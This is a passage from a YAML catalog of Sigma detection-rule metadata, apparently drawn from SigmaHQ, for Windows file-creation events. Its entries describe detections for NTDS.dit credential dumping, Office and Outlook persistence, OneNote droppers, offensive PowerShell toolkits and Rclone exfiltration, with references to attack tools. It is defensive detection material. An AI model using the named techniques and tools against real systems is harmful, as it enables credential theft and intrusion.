    by an uncommon process or a process located in a suspicious directory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.002
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.002
  - attack.t1003.003
  time_window: ''
  references:
  - https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/
  - https://adsecurity.org/?p=2398
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3a8da4e0-36c1-40d2-8b29-b3e890d5172a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_ntds_exfil_tools.yml
  name: NTDS Exfiltration Filename Patterns
  description: Detects creation of files with specific name patterns seen used in
    various tools that export the NTDS.DIT for exfiltration.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.003
  time_window: ''
  references:
  - https://github.com/rapid7/metasploit-framework/blob/eb6535009f5fdafa954525687f09294918b5398d/modules/post/windows/gather/ntds_grabber.rb
  - https://github.com/rapid7/metasploit-framework/blob/eb6535009f5fdafa954525687f09294918b5398d/data/post/powershell/NTDSgrab.ps1
  - https://github.com/SecureAuthCorp/impacket/blob/7d2991d78836b376452ca58b3d14daa61b67cb40/impacket/examples/secretsdump.py#L2405
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8e1cb247-6cf6-42fa-b440-3f27d57e9936
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_office_addin_persistence.yml
  name: Potential Persistence Via Microsoft Office Add-In
  description: Detects potential persistence activity via startup add-ins that load
    when Microsoft Office starts (.wll/.xll are simply .dll fit for Word or Excel).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1137.006
  tags:
  - attack.persistence
  - attack.t1137.006
  time_window: ''
  references:
  - Internal Research
  - https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence
  - https://github.com/redcanaryco/atomic-red-team/blob/4ae9580a1a8772db87a1b6cdb0d03e5af231e966/atomics/T1137.006/T1137.006.md
  false_positives:
  - Legitimate add-ins
  notes: ''
- detection_id: 91174a41-dc8f-401b-be89-7bfc140612a0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_office_macro_files_created.yml
  name: Office Macro File Creation
  description: Detects the creation of a new office macro files on the systems
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1566.001
  tags:
  - attack.initial-access
  - attack.t1566.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1566.001/T1566.001.md
  - https://learn.microsoft.com/en-us/deployoffice/compat/office-file-format-reference
  false_positives:
  - Very common in environments that rely heavily on macro documents
  notes: ''
- detection_id: 0e29e3a7-1ad8-40aa-b691-9f82ecd33d66
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_office_macro_files_downloaded.yml
  name: Office Macro File Download
  description: 'Detects the creation of a new office macro files on the system via
    an application (browser, mail client).

    This can help identify potential malicious activity, such as the download of macro-enabled
    documents that could be used for exploitation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1566.001
  tags:
  - attack.initial-access
  - attack.t1566.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1566.001/T1566.001.md
  - https://learn.microsoft.com/en-us/deployoffice/compat/office-file-format-reference
  false_positives:
  - Legitimate macro files downloaded from the internet
  - Legitimate macro files sent as attachments via emails
  notes: ''
- detection_id: b1c50487-1967-4315-a026-6491686d860e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_office_macro_files_from_susp_process.yml
  name: Office Macro File Creation From Suspicious Process
  description: Detects the creation of a office macro file from a a suspicious process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1566.001
  tags:
  - attack.initial-access
  - attack.t1566.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1566.001/T1566.001.md
  - https://learn.microsoft.com/en-us/deployoffice/compat/office-file-format-reference
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7fd164ba-126a-4d9c-9392-0d4f7c243df0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_office_onenote_files_in_susp_locations.yml
  name: OneNote Attachment File Dropped In Suspicious Location
  description: Detects creation of files with the ".one"/".onepkg" extension in suspicious
    or uncommon locations. This could be a sign of attackers abusing OneNote attachments
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/hackers-now-use-microsoft-onenote-attachments-to-spread-malware/
  - https://blog.osarmor.com/319/onenote-attachment-delivers-asyncrat-malware/
  false_positives:
  - Legitimate usage of ".one" or ".onepkg" files from those locations
  notes: ''
- detection_id: fcc6d700-68d9-4241-9a1a-06874d621b06
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_office_onenote_susp_dropped_files.yml
  name: Suspicious File Created Via OneNote Application
  description: Detects suspicious files created via the OneNote application. This
    could indicate a potential malicious ".one"/".onepkg" file was executed as seen
    being used in malware activity in the wild
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/hackers-now-use-microsoft-onenote-attachments-to-spread-malware/
  - https://blog.osarmor.com/319/onenote-attachment-delivers-asyncrat-malware/
  - https://twitter.com/MaD_c4t/status/1623414582382567424
  - https://labs.withsecure.com/publications/detecting-onenote-abuse
  - https://www.trustedsec.com/blog/new-attacks-old-tricks-how-onenote-malware-is-evolving/
  - https://app.any.run/tasks/17f2d378-6d11-4d6f-8340-954b04f35e83/
  false_positives:
  - False positives should be very low with the extensions list cited. Especially
    if you don't heavily utilize OneNote.
  - Occasional FPs might occur if OneNote is used internally to share different embedded
    documents
  notes: ''
- detection_id: 8c31f563-f9a7-450c-bfa8-35f8f32f1f61
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_office_outlook_macro_creation.yml
  name: New Outlook Macro Created
  description: Detects the creation of a macro file for Outlook.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1008
  - T1137
  - T1546
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.command-and-control
  - attack.t1137
  - attack.t1008
  - attack.t1546
  time_window: ''
  references:
  - https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/
  false_positives:
  - User genuinely creates a VB Macro for their email
  notes: ''
- detection_id: c3edc6a5-d9d4-48d8-930e-aab518390917
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_office_outlook_newform.yml
  name: Potential Persistence Via Outlook Form
  description: Detects the creation of a new Outlook form which can contain malicious
    code
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1137.003
  tags:
  - attack.persistence
  - attack.t1137.003
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=76
  - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=79
  - https://learn.microsoft.com/en-us/office/vba/outlook/concepts/outlook-forms/create-an-outlook-form
  - https://www.slipstick.com/developer/custom-form/clean-outlooks-forms-cache/
  false_positives:
  - Legitimate use of outlook forms
  notes: ''
- detection_id: fabb0e80-030c-4e3e-a104-d09676991ac3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_office_outlook_susp_file_creation_in_temp_dir.yml
  name: Suspicious File Created in Outlook Temporary Directory
  description: 'Detects the creation of files with suspicious file extensions in the
    temporary directory that Outlook uses when opening attachments.

    This can be used to detect spear-phishing campaigns that use suspicious files
    as attachments, which may contain malicious code.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1566.001
  tags:
  - attack.initial-access
  - attack.t1566.001
  time_window: ''
  references:
  - https://vipre.com/blog/svg-phishing-attacks-the-new-trick-in-the-cybercriminals-playbook/
  - https://thecyberexpress.com/rogue-rdp-files-used-in-ukraine-cyberattacks/
  - https://www.microsoft.com/en-us/security/blog/2024/10/29/midnight-blizzard-conducts-large-scale-spear-phishing-campaign-using-rdp-files/
  false_positives:
  - Opening of headers or footers in email signatures that include SVG images or legitimate
    SVG attachments
  notes: ''
- detection_id: 117d3d3a-755c-4a61-b23e-9171146d094c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_office_outlook_susp_macro_creation.yml
  name: Suspicious Outlook Macro Created
  description: Detects the creation of a macro file for Outlook.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1008
  - T1137
  - T1546
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.command-and-control
  - attack.t1137
  - attack.t1008
  - attack.t1546
  time_window: ''
  references:
  - https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/
  - https://speakerdeck.com/heirhabarov/hunting-for-persistence-via-microsoft-exchange-server-or-outlook?slide=53
  - https://www.linkedin.com/pulse/outlook-backdoor-using-vba-samir-b-/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 3d2a2d59-929c-4b78-8c1a-145dfe9e07b1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_office_publisher_files_in_susp_locations.yml
  name: Publisher Attachment File Dropped In Suspicious Location
  description: Detects creation of files with the ".pub" extension in suspicious or
    uncommon locations. This could be a sign of attackers abusing Publisher documents
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://twitter.com/EmericNasi/status/1623224526220804098
  false_positives:
  - Legitimate usage of ".pub" files from those locations
  notes: ''
- detection_id: 0e20c89d-2264-44ae-8238-aeeaba609ece
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_office_startup_persistence.yml
  name: Potential Persistence Via Microsoft Office Startup Folder
  description: Detects creation of Microsoft Office files inside of one of the default
    startup folders in order to achieve persistence.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1137
  tags:
  - attack.persistence
  - attack.t1137
  time_window: ''
  references:
  - https://insight-jp.nttsecurity.com/post/102hojk/operation-restylink-apt-campaign-targeting-japanese-companies
  - https://learn.microsoft.com/en-us/office/troubleshoot/excel/use-startup-folders
  false_positives:
  - Loading a user environment from a backup or a domain controller
  - Synchronization of templates
  notes: ''
- detection_id: c7a74c80-ba5a-486e-9974-ab9e682bc5e4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_office_susp_file_extension.yml
  name: File With Uncommon Extension Created By An Office Application
  description: Detects the creation of files with an executable or script extension
    by an Office application.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  tags:
  - attack.t1204.002
  - attack.execution
  time_window: ''
  references:
  - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/
  - https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml
  false_positives:
  - Unknown
  notes: ''
- detection_id: a10a2c40-2c4d-49f8-b557-1a946bc55d9d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_office_uncommon_file_startup.yml
  name: Uncommon File Created In Office Startup Folder
  description: Detects the creation of a file with an uncommon extension in an Office
    application startup folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1587.001
  tags:
  - attack.resource-development
  - attack.t1587.001
  time_window: ''
  references:
  - https://app.any.run/tasks/d6fe6624-6ef8-485d-aa75-3d1bdda2a08c/
  - http://addbalance.com/word/startup.htm
  - https://answers.microsoft.com/en-us/msoffice/forum/all/document-in-word-startup-folder-doesnt-open-when/44ab0932-2917-4150-8cdc-2f2cf39e86f3
  - https://en.wikipedia.org/wiki/List_of_Microsoft_Office_filename_extensions
  false_positives:
  - False positive might stem from rare extensions used by other Office utilities.
  notes: ''
- detection_id: 6e90ae7a-7cd3-473f-a035-4ebb72d961da
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_pcre_net_temp_file.yml
  name: PCRE.NET Package Temp Files
  description: Detects processes creating temp files related to PCRE.NET package
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://twitter.com/rbmaslen/status/1321859647091970051
  - https://twitter.com/tifkin_/status/1321916444557365248
  false_positives:
  - Unknown
  notes: ''
- detection_id: bbb7e38c-0b41-4a11-b306-d2a457b7ac2b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_perflogs_susp_files.yml
  name: Suspicious File Created In PerfLogs
  description: Detects suspicious file based on their extension being created in "C:\PerfLogs\".
    Note that this directory mostly contains ".etl" files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - Internal Research
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 7047d730-036f-4f40-b9d8-1c63e36d5e62
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_powershell_drop_binary_or_script.yml
  name: Potential Binary Or Script Dropper Via PowerShell
  description: Detects PowerShell creating a binary executable or a script file.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution
  false_positives:
  - False positives will differ depending on the environment and scripts used. Apply
    additional filters accordingly.
  notes: ''
- detection_id: 576426ad-0131-4001-ae01-be175da0c108
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_powershell_drop_powershell.yml
  name: PowerShell Script Dropped Via PowerShell.EXE
  description: Detects PowerShell creating a PowerShell file (.ps1). While often times
    this behavior is benign, sometimes it can be a sign of a dropper script trying
    to achieve persistence.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution
  false_positives:
  - False positives will differ depending on the environment and scripts used. Apply
    additional filters accordingly.
  notes: ''
- detection_id: f331aa1f-8c53-4fc3-b083-cc159bc971cb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_powershell_exploit_scripts.yml
  name: Malicious PowerShell Scripts - FileCreation
  description: Detects the creation of known offensive powershell scripts used for
    exploitation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 8
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  - risk_scoring_or_weighting
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/PowerShellMafia/PowerSploit
  - https://github.com/NetSPI/PowerUpSQL
  - https://github.com/CsEnox/EventViewer-UACBypass
  - https://web.archive.org/web/20210511204621/https://github.com/AlsidOfficial/WSUSpendu
  - https://github.com/nettitude/Invoke-PowerThIEf
  - https://github.com/S3cur3Th1sSh1t/WinPwn
  - https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries
  - https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1
  - https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1
  - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1
  - https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1
  - https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/
  - https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/
  - https://github.com/HarmJ0y/DAMP
  - https://github.com/samratashok/nishang
  - https://github.com/DarkCoderSc/PowerRunAsSystem/
  - https://github.com/besimorhino/powercat
  - https://github.com/Kevin-Robertson/Powermad
  - https://github.com/adrecon/ADRecon
  - https://github.com/adrecon/AzureADRecon
  - https://github.com/sadshade/veeam-creds/blob/6010eaf31ba41011b58d6af3950cffbf6f5cea32/Veeam-Get-Creds.ps1
  - https://github.com/The-Viper-One/Invoke-PowerDPAPI/
  - https://github.com/Arno0x/DNSExfiltrator/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e36941d0-c0f0-443f-bc6f-cb2952eb69ea
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_powershell_module_creation.yml
  name: PowerShell Module File Created
  description: Detects the creation of a new PowerShell module ".psm1", ".psd1", ".dll",
    ".ps1", etc.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - Internal Research
  - https://learn.microsoft.com/en-us/powershell/scripting/developer/module/understanding-a-windows-powershell-module?view=powershell-7.3
  false_positives:
  - Likely
  notes: ''
- detection_id: e8a52bbd-bced-459f-bd93-64db45ce7657
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_powershell_module_susp_creation.yml
  name: Potential Suspicious PowerShell Module File Created
  description: Detects the creation of a new PowerShell module in the first folder
    of the module directory structure "\WindowsPowerShell\Modules\malware\malware.psm1".
    This is somewhat an uncommon practice as legitimate modules often includes a version
    folder.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - Internal Research
  - https://learn.microsoft.com/en-us/powershell/scripting/developer/module/understanding-a-windows-powershell-module?view=powershell-7.3
  false_positives:
  - False positive rate will vary depending on the environments. Additional filters
    might be required to make this logic usable in production.
  notes: ''
- detection_id: e3845023-ca9a-4024-b2b2-5422156d5527
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_powershell_module_uncommon_creation.yml
  name: PowerShell Module File Created By Non-PowerShell Process
  description: Detects the creation of a new PowerShell module ".psm1", ".psd1", ".dll",
    ".ps1", etc. by a non-PowerShell process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - Internal Research
  - https://learn.microsoft.com/en-us/powershell/scripting/developer/module/understanding-a-windows-powershell-module?view=powershell-7.3
  false_positives:
  - Unknown
  notes: ''
- detection_id: 92fa78e7-4d39-45f1-91a3-8b23f3f1088d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_powershell_startup_shortcuts.yml
  name: Potential Startup Shortcut Persistence Via PowerShell.EXE
  description: 'Detects PowerShell writing startup shortcuts.

    This procedure was highlighted in Red Canary Intel Insights Oct. 2021, "We frequently
    observe adversaries using PowerShell to write malicious .lnk files into the startup
    directory to establish persistence.

    Accordingly, this detection opportunity is likely to identify persistence mechanisms
    in multiple threats.

    In the context of Yellow Cockatoo, this persistence mechanism eventually launches
    the command-line script that leads to the installation of a malicious DLL"

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://redcanary.com/blog/intelligence-insights-october-2021/
  - https://github.com/redcanaryco/atomic-red-team/blob/36d49de4c8b00bf36054294b4a1fcbab3917d7c5/atomics/T1547.001/T1547.001.md#atomic-test-7---add-executable-shortcut-link-to-user-startup-folder
  false_positives:
  - Depending on your environment accepted applications may leverage this at times.
    It is recommended to search for anomalies inidicative of malware.
  notes: ''
- detection_id: 1027d292-dd87-4a1a-8701-2abe04d7783c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_ps_script_policy_test_creation_by_uncommon_process.yml
  name: PSScriptPolicyTest Creation By Uncommon Process
  description: Detects the creation of the "PSScriptPolicyTest" PowerShell script
    by an uncommon process. This file is usually generated by Microsoft Powershell
    to test against Applocker.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.paloaltonetworks.com/blog/security-operations/stopping-powershell-without-powershell/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 34986307-b7f4-49be-92f3-e7a4d01ac5db
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_rclone_config_files.yml
  name: Rclone Config File Creation
  description: Detects Rclone config files being created
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567.002
  tags:
  - attack.exfiltration
  - attack.t1567.002
  time_window: ''
  references:
  - https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/
  false_positives:
  - Legitimate Rclone usage
  notes: ''
- detection_id: fccfb43e-09a7-4bd2-8b37-a5a7df33386d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_rdp_file_susp_creation.yml
  name: .RDP File Created By Uncommon Application
  description: 'Detects creation of a file with an ".rdp" extension by an application
    that doesn''t commonly create such files.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/
  - https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 130c9e58-28ac-4f83-8574-0a4cc913b97e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_redmimicry_winnti_filedrop.yml
  name: Potential Winnti Dropper Activity
  description: Detects files dropped by Winnti as described in RedMimicry Winnti playbook
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1027
  tags:
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://redmimicry.com/posts/redmimicry-winnti/#dropper
  false_positives:
  - Unknown
  notes: ''
- detection_id: 145095eb-e273-443b-83d0-f9b519b7867b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_regedit_print_as_pdf.yml
  name: PDF File Created By RegEdit.EXE
  description: 'Detects the creation of a file with the ".pdf" extension by the "RegEdit.exe"
    process.

    This indicates that a user is trying to print/save a registry key as a PDF in
    order to potentially extract sensitive information and bypass defenses.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://sensepost.com/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 7eff1a7f-dd45-4c20-877a-f21e342a7611
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_remcom_service.yml
  name: RemCom Service File Creation
  description: Detects default RemCom service filename which indicates RemCom service
    installation and execution
  query_language: sigma
  detection_type: reactive
